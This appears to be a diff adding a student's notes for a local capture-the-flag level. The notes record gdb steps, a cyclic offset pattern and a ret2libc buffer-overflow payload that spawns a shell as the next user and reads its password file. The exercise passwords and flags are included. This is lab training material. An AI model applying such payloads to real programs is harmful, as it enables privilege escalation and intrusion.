@@ -1,0 +1,35 @@
+ssh  level00@192.168.56.101 -p 4242
+password:level00
+
+su level04
+kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
+
+
+(gdb) i func 
+(gdb) set follow-fork-mode child
+(gdb) run
+
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+length: 156
+
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+(gdb) info registers $eip
+eip            0xf7fdb440	0xf7fdb440 <__kernel_vsyscall+16>
+
+(gdb) find &system, +9999999, "/bin/sh"
+0xf7f897ec
+
+(python -c "print 'a'*156 + '\xf7\xe6\xae\xd0'[::-1] + '\xf7\xfd\xb4\x40'[::-1] + '\xf7\xf8\x97\xec'[::-1]" ; cat) | ./level04
+
+whoami
+level05
+
+cd ../level05
+
+cat .pass
+
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
